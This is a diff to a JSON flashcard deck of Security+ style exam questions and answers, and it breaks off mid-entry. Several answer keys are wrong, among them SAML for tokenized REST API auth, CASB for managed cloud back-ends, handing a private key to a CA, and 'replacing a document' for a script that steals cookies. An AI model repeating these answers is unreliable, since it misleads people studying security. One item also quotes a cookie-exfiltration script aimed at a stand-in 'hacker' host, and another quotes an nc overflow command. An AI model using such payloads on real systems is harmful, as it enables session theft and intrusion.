@@ -2,15 +2,949 @@
   "id": "security-plus",
   "name": "Security Plus",
   "cards": [
-    { "front": "CIA triad", "back": "Confidentiality, Integrity, Availability — the three pillars of information security" },
-    { "front": "Phishing", "back": "Social engineering attack using fraudulent messages to steal credentials or data" },
-    { "front": "MFA", "back": "Multi-Factor Authentication — something you know, have, and are" },
-    { "front": "Zero Trust", "back": "Security model: never trust, always verify — no implicit trust by network location" },
-    { "front": "Symmetric vs asymmetric encryption", "back": "Symmetric = one shared key (AES). Asymmetric = public/private key pair (RSA)" },
-    { "front": "DDoS", "back": "Distributed Denial of Service — flooding a target from many sources to make it unavailable" },
-    { "front": "Least privilege", "back": "Users get only the minimum access needed to do their job" },
-    { "front": "SIEM", "back": "Security Information and Event Management — aggregates and analyzes security logs in real time" },
-    { "front": "Ransomware", "back": "Malware that encrypts data and demands payment for the decryption key" },
-    { "front": "Social engineering", "back": "Manipulating people, not systems, to gain access or information" }
+    {
+      "front": "CIA triad",
+      "back": "Confidentiality, Integrity, Availability — the three pillars of information security"
+    },
+    {
+      "front": "Phishing",
+      "back": "Social engineering attack using fraudulent messages to steal credentials or data"
+    },
+    {
+      "front": "MFA",
+      "back": "Multi-Factor Authentication — something you know, have, and are"
+    },
+    {
+      "front": "Zero Trust",
+      "back": "Security model: never trust, always verify — no implicit trust by network location"
+    },
+    {
+      "front": "Symmetric vs asymmetric encryption",
+      "back": "Symmetric = one shared key (AES). Asymmetric = public/private key pair (RSA)"
+    },
+    {
+      "front": "DDoS",
+      "back": "Distributed Denial of Service — flooding a target from many sources to make it unavailable"
+    },
+    {
+      "front": "Least privilege",
+      "back": "Users get only the minimum access needed to do their job"
+    },
+    {
+      "front": "SIEM",
+      "back": "Security Information and Event Management — aggregates and analyzes security logs in real time"
+    },
+    {
+      "front": "Ransomware",
+      "back": "Malware that encrypts data and demands payment for the decryption key"
+    },
+    {
+      "front": "Social engineering",
+      "back": "Manipulating people, not systems, to gain access or information"
+    },
+    {
+      "front": "A security administrator wants to implement a logon script that will prevent MITM attacks on the local LAN. Which of the following commands should the security administrator implement within the script to accomplish this task?\nA. arp - s 192.168.1.1 00-3a-d1-fa-b1-06\nB. dig - x@192.168.1.1 mypc.comptia.com\nC. nmap - A - T4 192.168.1.1\nD. tcpdump - lnv host 192.168.1.1 or either 00:3a:d1:fa:b1:06",
+      "back": "A. arp - s 192.168.1.1 00-3a-d1-fa-b1-06"
+    },
+    {
+      "front": "Which of the following is the BEST reason for salting a password hash before it is stored in a database?\nA. To prevent duplicate values from being stored\nB. To make the password retrieval process very slow\nC. To protect passwords from being saved in readable format\nD. To prevent users from using simple passwords for their access credentials",
+      "back": "A. To prevent duplicate values from being stored"
+    },
+    {
+      "front": "An actor downloads and runs a program against a corporate login page. The program imports a list of usernames and passwords, looking for a successful attempt. Which of the following terms BEST describes the actor in this situation?\nA. Script kiddie\nB. Hacktivist\nC. Cryptologist\nD. Security auditor",
+      "back": "A. Script kiddie"
+    },
+    {
+      "front": "An organization wants to utilize a common, Internet-based third-party provider for authorization and authentication. The provider uses a technology based on OAuth 2.0 to provide required services. To which of the following technologies is the provider referring?\nA. OpenID Connect\nB. SAML\nC. XACML\nD. LDAP",
+      "back": "A. OpenID Connect"
+    },
+    {
+      "front": "A penetration tester harvests potential usernames from a social networking site. The penetration tester then uses social engineering to attempt to obtain associated passwords to gain unauthorized access to shares on a network server. Which of the following methods is the penetration tester MOST likely using?\nA. Escalation of privilege\nB. SQL injection\nC. Active reconnaissance\nD. Proxy server",
+      "back": "C. Active reconnaissance"
+    },
+    {
+      "front": "Which of the following could occur when both strong and weak ciphers are configured on a VPN concentrator? (Select TWO)\nA. An attacker could potentially perform a downgrade attack.\nB. The connection is vulnerable to resource exhaustion.\nC. The integrity of the data could be at risk.\nD. The VPN concentrator could revert to L2TP.\nE. The IPSec payload reverted to 16-bit sequence numbers.",
+      "back": "A. An attacker could potentially perform a downgrade attack.\nE. The IPSec payload reverted to 16-bit sequence numbers."
+    },
+    {
+      "front": "Which of the following is the BEST choice for a security control that represents a preventive and corrective logical control at the same time?\nA. Security awareness training\nB. Antivirus\nC. Firewalls\nD. Intrusion detection system",
+      "back": "B. Antivirus"
+    },
+    {
+      "front": "A web developers improves client access to the company's REST API. Authentication needs to be tokenized but not expose the client's password. Which of the following methods would BEST meet the developer's requirements?\nA. SAML\nB. LDAP\nC. OAuth\nD. Shibboleth",
+      "back": "A. SAML"
+    },
+    {
+      "front": "A vulnerability scan is being conducted against a desktop system. The scan is looking for files, versions, and registry values known to be associated with system vulnerabilities. Which of the following BEST describes the type of scan being performed?\nA. Non-intrusive\nB. Authenticated\nC. Credentialed\nD. Active",
+      "back": "C. Credentialed"
+    },
+    {
+      "front": "A security analyst is updating a BIA document. The security analyst notices the support vendor's time to replace a server hard drive went from eight hours to two hours. Given these new metrics, which of the following can be concluded? (Select TWO)\nA. The MTTR is faster.\nB. The MTTR is slower.\nC. The RTO has increased.\nD. The RTO has decreased.\nE. The MTTF has increased.\nF. The MTTF has decreased.",
+      "back": "A. The MTTR is faster.\nD. The RTO has decreased."
+    },
+    {
+      "front": "Which of the following could help detect trespassers in a secure facility? (Select TWO)\nA. Faraday cages\nB. Motion-detection sensors\nC. Tall, chain-link fencing\nD. Security guards\nE. Smart cards",
+      "back": "B. Motion-detection sensors\nD. Security guards"
+    },
+    {
+      "front": "The IT department is deploying new computers. To ease the transition, users will be allowed to access their old and new systems. The help desk is receive reports that users are experiencing the following error when attempting to log in to their previous system: Logon Failure: Access Denied Which of the following can cause this issue?\nA. Permission issues\nB. Access violations\nC. Certificate issues\nD. Misconfigured devices",
+      "back": "C. Certificate issues"
+    },
+    {
+      "front": "A third-party penetration testing company was able to successfully use an ARP cache poison technique to gain root access on a server. The tester successfully moved to another server that was not in the original network. Which of the following is the MOST likely method used to gain access to the other host?\nA. Backdoor\nB. Pivoting\nC. Persistance\nD. Logic bomp",
+      "back": "B. Pivoting"
+    },
+    {
+      "front": "Ann, a security administrator, wants to ensure credentials are encrypted in transit when implementing a RADIUS server for SSO. Which of the following are needed given these requirements? (Select TWO)\nA. Public key\nB. Shared key\nC. Elliptic curve\nD. MD5\nE. Private key\nF. DES",
+      "back": "A. Public key\nE. Private key"
+    },
+    {
+      "front": "The POODLE attack is a MITM exploit that affects:\nA. TLS1.0 with CBC mode cipher.\nB. SSLv2.0 with CBC mode cipher,\nC. SSLv3.0 with CBC mode cipher.\nD. SSLv3.0 with ECB mode cipher.",
+      "back": "C. SSLv3.0 with CBC mode cipher."
+    },
+    {
+      "front": "To determine the ALE of a particular risk, which of the following must be calculated? (Select TWO).\nA. ARO\nB. ROI\nC. RPO\nD. SLE\nE. RTO",
+      "back": "A. ARO\nD. SLE"
+    },
+    {
+      "front": "Which of the following are used to increase the computing time it takes to brute force a password using an offline attack? (Select TWO)\nA. XOR\nB. PBKDF2\nC. bcrypt\nD. HMAC\nE. RIPEMD",
+      "back": "B. PBKDF2\nC. bcrypt"
+    },
+    {
+      "front": "Users in a corporation currently authenticate with a username and password. A security administrator wishes to implement two-factor authentication to improve security. Which of the following authentication methods should be deployed to achieve this goal?\nA. PIN\nB. Security question\nC. Smart card\nD. Passphrase\nE. CAPTCHA",
+      "back": "C. Smart card"
+    },
+    {
+      "front": "A security administrator needs to address the following audit recommendations for a public-facing SFTP server: Users should be restricted to upload and download files to their own home directories only. Users should not be allowed to use interactive shell login. Which of the following configuration parameters should be implemented? (Select TWO).\nA. PermitTunnel\nB. ChrootDirectory\nC. PermitTTY\nD. AllowTcpForwarding\nE. IgnoreRhosts",
+      "back": "B. ChrootDirectory\nC. PermitTTY"
+    },
+    {
+      "front": "An organization recently moved its custom web applications to the cloud, and it is obtaining managed services of the back-end environment as part of its subscription. Which of the following types of services is this company now using?\nA. SaaS\nB. CASB\nC. IaaS\nD. PaaS",
+      "back": "B. CASB\n\nSecurity Broker (CASB) gives you both visibility into your entire cloud stack and the security automation tool your IT team needs."
+    },
+    {
+      "front": "Which of the following is commonly done as part of a vulnerability scan?\nA. Exploiting misconfigured applications\nB. Cracking employee passwords\nC. Sending phishing emails to employees\nD. Identifying unpatched workstations",
+      "back": "D. Identifying unpatched workstations"
+    },
+    {
+      "front": "A company is evaluating cloud providers to reduce the cost of its internal IT operations. The company's aging systems are unable to keep up with customer demand. Which of the following cloud models will the company MOST likely select?\nA. PaaS\nB. SaaS\nC. IaaS\nD. BaaS",
+      "back": "C. IaaS"
+    },
+    {
+      "front": "After a security incident, management is meeting with involved employees to document the incident and its aftermath. Which of the following BEST describes this phase of the incident response process?\nA. Lessons learned\nB. Recovery\nC. Identification\nD. Preparation",
+      "back": "A. Lessons learned"
+    },
+    {
+      "front": "After an identified security breach, an analyst is tasked to initiate the IR process. Which of the following is the NEXT step the analyst should take?\nA. Recovery\nB. Identification\nC. Preparation\nD. Documentation\nE. Escalation",
+      "back": "B. Identification"
+    },
+    {
+      "front": "A user needs to send sensitive information to a colleague using PKI. Which of the following concepts apply when a sender encrypts the message hash with the sender's private key? (Select TWO)\nA. Non-repudiation\nB. Email content encryption\nC. Steganography\nD. Transport security\nE. Message integrity",
+      "back": "A. Non-repudiation\nE. Message integrity"
+    },
+    {
+      "front": "A technician suspects that a system has been compromised. The technician reviews the following log entry: WARNING - hash mismatch: C:\\Window\\SysWOW64\\user32.dll WARNING - hash mismatch: C:\\Window\\SysWOW64\\kernel32.dll Based solely on the above information, which of the following types of malware is MOST likely installed on the system?\nA. Rootkit\nB. Ransomware\nC. Trojan\nD. Backdoor",
+      "back": "A. Rootkit"
+    },
+    {
+      "front": "As part of a new BYOD rollout, a security analyst has been asked to find a way to securely store company data on personal devices. Which of the following would BEST help to accomplish this?\nA. Require the use of an eight-character PIN.\nB. Implement containerization of company data.\nC. Require annual AUP sign-off.\nD. Use geofencing tools to unlock devices while on the premises.",
+      "back": "B. Implement containerization of company data."
+    },
+    {
+      "front": "A web server, which is configured to use TLS with AES-GCM-256, SHA-384, and ECDSA, recently suffered an information loss breach. Which of the following is MOST likely the cause?\nA. Insufficient key bit length\nB. Weak cipher suite\nC. Unauthenticated encryption method\nD. Poor implementation",
+      "back": "D. Poor implementation"
+    },
+    {
+      "front": "An incident involving a workstation that is potentially infected with a virus has occurred. The workstation may have sent confidential data to an unknown internet server. Which of the following should a security analyst do FIRST?\nA. Make a copy of everything in memory on the workstation.\nB. Turn off the workstation.\nC. Consult the information security policy.\nD. Run a virus scan.",
+      "back": "A. Make a copy of everything in memory on the workstation."
+    },
+    {
+      "front": "Which of the following BEST describes an important security advantage yielded by implementing vendor diversity?\nA. Sustainability\nB. Homogeneity\nC. Resiliency\nD. Configurability",
+      "back": "C. Resiliency"
+    },
+    {
+      "front": "A dumpster diver recovers several hard drives from a company and is able to obtain confidential data from one of the hard drives. The company then discovers its information is posted online. Which of the following methods would have MOST likely prevented the data from being exposed?\nA. Removing the hard drive from its enclosure\nB. Using software to repeatedly rewrite over the disk space\nC. Using Blowfish encryption on the hard drives\nD. Using magnetic fields to erase the data",
+      "back": "D. Using magnetic fields to erase the data"
+    },
+    {
+      "front": "A manager wants to distribute a report to several other managers with the company. Some of them reside in remote locations that are not connected to the domain but have a local server. Because there is sensitive data within the report and the size of the report is beyond the limit of the email attachment size, emailing the report is not an option. Which of the following protocols should be implemented to distribute the report securely? (Select THREE)\nA. S/MIME\nB. SSH\nC. SNMPv3\nD. FTPS\nE. SRTP\nF. HTTPS\nG. LDAPS",
+      "back": "B. SSH\nD. FTPS\nF. HTTPS"
+    },
+    {
+      "front": "A vice president at a manufacturing organization is concerned about desktops being connected to the network. Employees need to log onto the desktops' local account to verify that a product is being created within specifications; otherwise, the desktops should be as isolated as possible. Which of the following is the BEST way to accomplish this?\nA. Put the desktops in the DMZ.\nB. Create a separate VLAN for the desktops.\nC. Air gap the desktops.\nD. Join the desktops to an ad-hoc network.",
+      "back": "C. Air gap the desktops."
+    },
+    {
+      "front": "An in-house penetration tester has been asked to evade a new DLP system. The tester plans to exfiltrate data through steganography. Discovery of which of the following would help catch the tester in the act?\nA. Abnormally high numbers of outgoing instant messages that contain obfuscated text\nB. Large-capacity USB drives on the tester's desk with encrypted zip files\nC. Outgoing emails containing unusually large image files\nD. Unusual SFTP connections to a consumer IP address",
+      "back": "C. Outgoing emails containing unusually large image files"
+    },
+    {
+      "front": "A member of the admins group reports being unable to modify the \"changes\" file on a server. The permissions on the file are as follows: Permissions User Group File -rwxrw-r--+ Admins Admins changes Based on the output above, which of the following BEST explains why the user is unable to modify the \"changes\" file?\nA. The SELinux mode on the server is set to \"enforcing.\"\nB. The SELinux mode on the server is set to \"permissive.\"\nC. An FACL has been added to the permissions for the file.\nD. The admins group does not have adequate permissions to access the file.",
+      "back": "C. An FACL has been added to the permissions for the file."
+    },
+    {
+      "front": "A penetration tester is conducting an assessment on Comptia.org and runs the following command from a coffee shop while connected to the public Internet: c:\\nslookup -querytype=MX comptia.org Server: Unknown Address: 198.51.100.45 comptia.org MX preference=10, mail exchanger = 92.68.102.33 comptia.org MX preference=20, mail exchanger = exchg1.comptia.org exchg1.comptia.org internet address = 192.168.102.67 Which of the following should the penetration tester conclude about the command output?\nA. The public/private views on the Comptia.org DNS servers are misconfigured.\nB. Comptia.org is running an older mail server, which may be vulnerable to exploits.\nC. The DNS SPF records have not been updated for Comptia.org.\nD. 192.168.102.67 is a backup mail server that may be more vulnerable to attack.",
+      "back": "D. 192.168.102.67 is a backup mail server that may be more vulnerable to attack."
+    },
+    {
+      "front": "A security analyst is inspecting the results of a recent internal vulnerability scan that was performed against intranet services. The scan reports include the following critical-rated vulnerability: Title: Remote Command Execution vulnerability in web server Rating: Critical (CVSS 10.0) Threat actor: any remote user of the web server Confidence: certain Recommendation: apply vendor patches Which of the following actions should the security analyst perform FIRST?\nA. Escalate the issue to senior management.\nB. Apply organizational context to the risk rating.\nC. Organize for urgent out-of-cycle patching.\nD. Exploit the server to check whether it is a false positive.",
+      "back": "B. Apply organizational context to the risk rating."
+    },
+    {
+      "front": "Company A agrees to provide perimeter protection, power, and environmental support with measurable goals for Company B, but will not be responsible for user authentication or patching of operating systems within the perimeter. Which of the following is being described?\nA. Service level agreement\nB. Memorandum of understanding\nC. Business partner agreement\nD. Interoperability agreement",
+      "back": "A. Service level agreement"
+    },
+    {
+      "front": "A company is deploying smartphones for its mobile salesforce. These devices are for personal and business use but are owned by the company. Sales personnel will save new customer data via a custom application developed for the company. This application will integrate with the contact information stored in the smartphones and will populate new customer records onto it. The customer application's data is encrypted at rest, and the application's connection to the back office system is considered secure. The Chief Information Security Officer (CISO) has concerns that customer contact information may be accidentally leaked due to the limited security capabilities of the devices and the planned controls. Which of the following will be the MOST efficient security control to implement to lower this risk?\nA. Implement a mobile data loss agent on the devices to prevent any user manipulation with the contact information.\nB. Restrict screen capture features on the devices when using the custom application and the contact information.\nC. Restrict contact information storage data flow so it is only shared with the customer application.\nD. Require complex passwords for authentication when accessing the contact information.",
+      "back": "C. Restrict contact information storage data flow so it is only shared with the customer application."
+    },
+    {
+      "front": "The Chief Information Security Officer (CISO) is asking for ways to protect against zero-day exploits. The CISO is concerned that an unrecognized threat could compromise corporate data and result in regulatory fines as well as poor corporate publicity. The network is mostly flat, with split staff/guest wireless functionality. Which of the following equipment MUST be deployed to guard against unknown threats?\nA. Cloud-based antivirus solution, running as local admin, with push technology for definition updates\nB. Implementation of an off-site datacenter hosting all company data, as well as deployment of VDI for all client computing needs\nC. Host-based heuristic IPS, segregated on a management VLAN, with direct control of the perimeter firewall ACLs\nD. Behavior-based IPS with a communication link to a cloud-based vulnerability and threat feed",
+      "back": "D. Behavior-based IPS with a communication link to a cloud-based vulnerability and threat feed"
+    },
+    {
+      "front": "An organization has several production-critical SCADA supervisory systems that cannot follow the normal 30- day patching policy. Which of the following BEST maximizes the protection of these systems from malicious software?\nA. Configure a firewall with deep packet inspection that restricts traffic to the systems.\nB. Configure a separate zone for the systems and restrict access to known ports.\nC. Configure the systems to ensure only necessary applications are able to run.\nD. Configure the host firewall to ensure only the necessary applications have listening ports.",
+      "back": "A. Configure a firewall with deep packet inspection that restricts traffic to the systems."
+    },
+    {
+      "front": "An organization identifies a number of hosts making outbound connections to a known malicious IP over port TCP 80. The organization wants to identify the data being transmitted and prevent future connections to this IP. Which of the following should the organization do to achieve this outcome?\nA. Use a protocol analyzer to reconstruct the data and implement a web-proxy.\nB. Deploy a web-proxy and then blacklist the IP on the firewall.\nC. Deploy a web-proxy and implement IPS at the network edge.\nD. Use a protocol analyzer to reconstruct the data and blacklist the IP on the firewall.",
+      "back": "D. Use a protocol analyzer to reconstruct the data and blacklist the IP on the firewall."
+    },
+    {
+      "front": "Legal authorities notify a company that its network has been compromised for the second time in two years. The investigation shows the attackers were able to use the same vulnerability on different systems in both attacks. Which of the following would have allowed the security team to use historical information to protect against the second attack?\nA. Key risk indicators\nB. Lessons learned\nC. Recovery point objectives\nD. Tabletop exercise",
+      "back": "B. Lessons learned"
+    },
+    {
+      "front": "A small company's Chief Executive Officer (CEO) has asked its Chief Security Officer (CSO) to improve the company's security posture quickly with regard to targeted attacks. Which of the following should the CSO conduct FIRST?\nA. Survey threat feeds from services inside the same industry.\nB. Purchase multiple threat feeds to ensure diversity and implement blocks for malicious traffic.\nC. Conduct an internal audit against industry best practices to perform a qualitative analysis.\nD. Deploy a UTM solution that receives frequent updates from a trusted industry vendor.",
+      "back": "A. Survey threat feeds from services inside the same industry."
+    },
+    {
+      "front": "During a routine vulnerability assessment, the following command was successful: echo \"vrfy 'perl -e 'print \"hi\" x 500 ' ' \" | nc www.company.com 25 Which of the following vulnerabilities is being exploited?\nA. Buffer overflow directed at a specific host MTA\nB. SQL injection directed at a web server\nC. Cross-site scripting directed at www.company.com\nD. Race condition in a UNIX shell script",
+      "back": "A. Buffer overflow directed at a specific host MTA"
+    },
+    {
+      "front": "A forensic investigator has run into difficulty recovering usable files from a SAN drive. Which of the following SAN features might have caused the problem?\nA. Storage multipaths\nB. Deduplication\nC. iSCSI initiator encryption\nD. Data snapshots",
+      "back": "B. Deduplication"
+    },
+    {
+      "front": "A company offers SaaS, maintaining all customers' credentials and authenticating locally. Many large customers have requested the company offer some form of federation with their existing authentication infrastructures. Which of the following would allow customers to manage authentication and authorizations from within their existing organizations?\nA. Implement SAML so the company's services may accept assertions from the customers' authentication servers.\nB. Provide customers with a constrained interface to manage only their users' accounts in the company's active directory server.\nC. Provide a system for customers to replicate their users' passwords from their authentication service to the company's.\nD. Use SOAP calls to support authentication between the company's product and the customers' authentication servers.",
+      "back": "A. Implement SAML so the company's services may accept assertions from the customers' authentication servers."
+    },
+    {
+      "front": "A software development manager is taking over an existing software development project. The team currently suffers from poor communication due to a long delay between requirements documentation and feature delivery. This gap is resulting in an above average number of security-related bugs making it into production. Which of the following development methodologies is the team MOST likely using now?\nA. Agile\nB. Waterfall\nC. Scrum\nD. Spiral",
+      "back": "B. Waterfall"
+    },
+    {
+      "front": "Following the successful response to a data-leakage incident, the incident team lead facilitates an exercise that focuses on continuous improvement of the organization's incident response capabilities. Which of the following activities has the incident team lead executed?\nA. Lessons learned review\nB. Root cause analysis\nC. Incident audit\nD. Corrective action exercise",
+      "back": "A. Lessons learned review"
+    },
+    {
+      "front": "A security analyst is attempting to break into a client's secure network. The analyst was not given prior information about the client, except for a block of public IP addresses that are currently in use. After network enumeration, the analyst's NEXT step is to perform:\nA. a gray-box penetration test.\nB. a risk analysis.\nC. a vulnerability assessment.\nD. an external security audit.\nE. a red team exercise.",
+      "back": "A. a gray-box penetration test."
+    },
+    {
+      "front": "A security architect has convened a meeting to discuss an organization's key management policy. The organization has a reliable internal key management system, and some argue that it would be best to manage the cryptographic keys internally as opposed to using a solution from a third party. The company should use:\nA. the current internal key management system.\nB. a third-party key management system that will reduce operating costs.\nC. risk benefits analysis results to make a determination.\nD. a software solution including secure key escrow capabilities.",
+      "back": "C. risk benefits analysis results to make a determination."
+    },
+    {
+      "front": "After a recent internal breach, a company decided to regenerate and reissue all certificates used in the transmission of confidential information. The company places the greatest importance on confidentiality and non-repudiation, and decided to generate dual key pairs for each client. Which of the following BEST describes how the company will use these certificates?\nA. One key pair will be used for encryption and decryption. The other will be used to digitally sign the data.\nB. One key pair will be used for encryption. The other key pair will provide extended validation.\nC. Data will be encrypted once by each key, doubling the confidentiality and non-repudiation strength.\nD. One key pair will be used for internal communication, and the other will be used for external communication.",
+      "back": "A. One key pair will be used for encryption and decryption. The other will be used to digitally sign the data."
+    },
+    {
+      "front": "A security manager is creating an account management policy for a global organization with sales personnel who must access corporate network resources while traveling all over the world. Which of the following practices is the security manager MOST likely to enforce with the policy? (Select TWO)\nA. Time-of-day restrictions\nB. Password complexity\nC. Location-based authentication\nD. Group-based access control\nE. Standard naming convention",
+      "back": "B. Password complexity\nD. Group-based access control"
+    },
+    {
+      "front": "A network administrator at a small office wants to simplify the configuration of mobile clients connecting to an encrypted wireless network. Which of the following should be implemented if the administrator does not want to provide the wireless password or certificate to the employees?\nA. WPS\nB. 802.1x\nC. WPA2-PSK\nD. TKIP",
+      "back": "A. WPS"
+    },
+    {
+      "front": "A security administrator learns that PII, which was gathered by the organization, has been found in an open forum. As a result, several C-level executives found their identities were compromised, and they were victims of a recent whaling attack. Which of the following would prevent these problems in the future? (Select TWO).\nA. Implement a reverse proxy.\nB. Implement an email DLP.\nC. Implement a spam filter.\nD. Implement a host-based firewall.\nE. Implement a HIDS.",
+      "back": "B. Implement an email DLP.\nC. Implement a spam filter."
+    },
+    {
+      "front": "A security engineer is configuring a wireless network with EAP-TLS. Which of the following activities is a requirement for this configuration?\nA. Setting up a server\nB. Configuring federation between authentication servers\nC. Enabling TOTP\nD. Deploying certificates to endpoint devices",
+      "back": "D. Deploying certificates to endpoint devices"
+    },
+    {
+      "front": "Ann is the IS manager for several new systems in which the classification of the systems' data are being decided. She is trying to determine the sensitivity level of the data being processed. Which of the following people should she consult to determine the data classification?\nA. Steward\nB. Custodian\nC. User\nD. Owner",
+      "back": "D. Owner"
+    },
+    {
+      "front": "Which of the following BEST describes a network-based attack that can allow an attacker to take full control of a vulnerable host?\nA. Remote exploit\nB. Amplification\nC. Sniffing\nD. Man-in-the-middle",
+      "back": "A. Remote exploit"
+    },
+    {
+      "front": "A systems administrator wants to generate a self-signed certificate for an internal website. Which of the following steps should the systems administrator complete prior to installing the certificate on the server?\nA. Provide the private key to a public CA.\nB. Provide the public key to the internal CA.\nC. Provide the public key to a public CA.\nD. Provide the private key to the internal CA.\nE. Provide the public/private key pair to the internal CA.\nF. Provide the public/private key pair to a public CA.",
+      "back": "D. Provide the private key to the internal CA."
+    },
+    {
+      "front": "A security analyst has received the following alert snippet from the HIDS appliance: PROTOCOL SIG SRC.PORT DST.PORT TCP XMAS SCAN 192.168.1.1:1091 192.168.1.2:8891 TCP XMAS SCAN 192.168.1.1:649 192.168.1.2:9001 TCP XMAS SCAN 192.168.1.1:2264 192.168.1.2:6455 TCP XMAS SCAN 192.168.1.1:3464 192.168.1.2:8744 Given the above logs, which of the following is the cause of the attack?\nA. The TCP ports on destination are all open.\nB. FIN, URG, and PSH flags are set in the packet header.\nC. TCP MSS is configured improperly.\nD. There is improper Layer 2 segmentation.",
+      "back": "B. FIN, URG, and PSH flags are set in the packet header."
+    },
+    {
+      "front": "Which of the following controls allows a security guard to perform a post-incident review?\nA. Detective\nB. Preventive\nC. Corrective\nD. Deterrent",
+      "back": "A. Detective"
+    },
+    {
+      "front": "Attackers have been using revoked certificates for MITM attacks to steal credentials from employees of Company.com. Which of the following options should Company.com implement to mitigate these attacks?\nA. Captive portal\nB. Extended validation certificate\nC. OCSP stapling\nD. Object identifiers\nE. Key escrow",
+      "back": "C. OCSP stapling"
+    },
+    {
+      "front": "After attempting to harden a web server, a security analyst needs to determine if an application remains vulnerable to SQL injection attacks. Which of the following would BEST assist the analyst in making this determination?\nA. tracert\nB. Fuzzer\nC. nslookup\nD. Nmap\nE. netcat",
+      "back": "B. Fuzzer"
+    },
+    {
+      "front": "A company is allowing a BYOD policy for its staff. Which of the following is a best practice that can decrease the risk of users jailbreaking mobile devices?\nA. Install a corporately monitored mobile antivirus on the devices.\nB. Prevent the installation of applications from a third-party application store.\nC. Build a custom ROM that can prevent jailbreaking.\nD. Require applications to be digitally signed.",
+      "back": "B. Prevent the installation of applications from a third-party application store."
+    },
+    {
+      "front": "Which of the following describes the key difference between vishing and phishing attacks?\nA. Phishing is used by attackers to steal a person's identity.\nB. Vishing attacks require some knowledge of the target of attack.\nC. Vishing attacks are accomplished using telephony services.\nD. Phishing is a category of social engineering attack.",
+      "back": "C. Vishing attacks are accomplished using telephony services."
+    },
+    {
+      "front": "Which of the following should a security analyst perform FIRST to determine the vulnerabilities of a legacy system?\nA. Passive scan\nB. Aggressive scan\nC. Credentialed scan\nD. Intrusive scan",
+      "back": "A. Passive scan"
+    },
+    {
+      "front": "Which of the following components of printers and MFDs are MOST likely to be used as vectors of compromise if they are improperly configured?\nA. Embedded web server\nB. Spooler\nC. Network interface\nD. LCD control panel",
+      "back": "A. Embedded web server"
+    },
+    {
+      "front": "A hacker has a packet capture that contains: ....Joe Smith.........E289F21CD33E4F57890DDEA5CF267ED2.. ...Jane.Doe...........AD1FAB10D33E4F57890DDEA5CF267ED2.. ....John.Key..........3374E9E7E33E4F57890DDEA5CF267ED2.. Which of the following tools will the hacker use against this type of capture?\nA. Password cracker\nB. Vulnerability scanner\nC. DLP scanner\nD. Fuzzer",
+      "back": "A. Password cracker"
+    },
+    {
+      "front": "A user downloads and installs an MP3 converter, and runs the application. Upon running the application, the antivirus detects a new port in a listening state. Which of the following has the user MOST likely executed?\nA. RAT\nB. Worm\nC. Ransomware\nD. Bot",
+      "back": "A. RAT"
+    },
+    {
+      "front": "An attacker exploited a vulnerability on a mail server using the code below. <HTML><body onload=document.location.replace ('http://hacker/post.asp?victim&message =\" + document.cookie + \"<br>\" + \"URL:\" +\"document.location) ; /> </body> </HTML> Which of the following BEST explains what the attacker is doing?\nA. The attacker is replacing a cookie.\nB. The attacker is stealing a document.\nC. The attacker is replacing a document.\nD. The attacker is deleting a cookie.",
+      "back": "C. The attacker is replacing a document."
+    },
+    {
+      "front": "A security analyst is securing smartphones and laptops for a highly mobile workforce. Priorities include: Remote wipe capabilities Geolocation services Patch management and reporting Mandatory screen locks Ability to require passcodes and pins Ability to require encryption Which of the following would BEST meet these requirements?\nA. Implementing MDM software\nB. Deploying relevant group policies to the devices\nC. Installing full device encryption\nD. Removing administrative rights to the devices",
+      "back": "A. Implementing MDM software"
+    },
+    {
+      "front": "A technician receives a device with the following anomalies: Frequent pop-up ads Show response-time switching between active programs Unresponsive peripherals The technician reviews the following log file entries: File Name Source MD5 Target MD5 Status antivirus.exe F794F21CD33E4F57890DDEA5CF267ED2 F794F21CD33E4F57890DDEA5CF267ED2 Automatic iexplore.exe 7FAAF21CD33E4F57890DDEA5CF29CCEA AA87F21CD33E4F57890DDEAEE2197333 Automatic service.exe 77FF390CD33E4F57890DDEA5CF28881F 77FF390CD33E4F57890DDEA5CF28881F Manual USB.exe E289F21CD33E4F57890DDEA5CF28EDC0 E289F21CD33E4F57890DDEA5CF28EDC0 Stopped Based on the above output, which of the following should be reviewed?\nA. The web application firewall\nB. The file integrity check\nC. The data execution prevention\nD. The removable media control",
+      "back": "B. The file integrity check"
+    },
+    {
+      "front": "A systems administrator is attempting to recover from a catastrophic failure in the datacenter. To recover the domain controller, the systems administrator needs to provide the domain administrator credentials. Which of the following account types is the systems administrator using?\nA. Guest account\nB. Service account\nC. User account\nD. Local Account",
+      "back": "C. User account"
+    },
+    {
+      "front": "An organization plans to implement multifactor authentication techniques within the enterprise network architecture. Each authentication factor is expected to be a unique control. Which of the following BEST describes the proper employment of multifactor authentication?\nA. Proximity card, fingerprint scanner, PIN\nB. Fingerprint scanner, voice recognition, proximity card\nC. Smart card, user PKI certificate, privileged user certificate\nD. Voice recognition, smart card, proximity card",
+      "back": "A. Proximity card, fingerprint scanner, PIN"
+    },
+    {
+      "front": "Multiple organizations operating in the same vertical want to provide seamless wireless access for their employees as they visit the other organizations. Which of the following should be implemented if all the organizations use the native 802.1x client on their mobile devices?\nA. Shibboleth\nB. RADIUS federation\nC. SAML\nD. OAuth\nE. OpenlD connect",
+      "back": "B. RADIUS federation"
+    },
+    {
+      "front": "Upon entering an incorrect password, the logon screen displays a message informing the user that the password does not match the username provided and is not the required length of 12 characters. Which of the following secure coding techniques should a security analyst address with the application developers to follow security best practices?\nA. Input validation\nB. Error handling\nC. Obfuscation\nD. Data exposure",
+      "back": "B. Error handling"
+    },
+    {
+      "front": "A security administrator is developing controls for creating audit trails and tracking if a PHI data breach is to occur. The administrator has been given the following requirements: *All access must be correlated to a user account. *All user accounts must be assigned to a single individual. *User access to the PHI data must be recorded. *Anomalies in PHI data access must be reported. *Logs and records cannot be deleted or modified. Which of the following should the administrator implement to meet the above requirements? (Select THREE).\nA. Eliminate shared accounts.\nB. Create a standard naming convention for accounts.\nC. Implement usage auditing and review.\nD. Enable account lockout thresholds.\nE. Copy logs in real time to a secured WORM drive.\nF. Implement time-of-day restrictions.\nG. Perform regular permission audits and reviews.",
+      "back": "A. Eliminate shared accounts.\nC. Implement usage auditing and review.\nE. Copy logs in real time to a secured WORM drive."
+    },
+    {
+      "front": "An administrator is replacing a wireless router. The configuration of the old wireless router was not documented before it stopped functioning. The equipment connecting to the wireless network uses older legacy equipment that was manufactured prior to the release of the 802.11i standard. Which of the following configuration options should the administrator select for the new wireless router?\nA. WPA+CCMP\nB. WPA2+CCMP\nC. WPA+TKIP\nD. WPA2+TKIP",
+      "back": "C. WPA+TKIP"
+    },
+    {
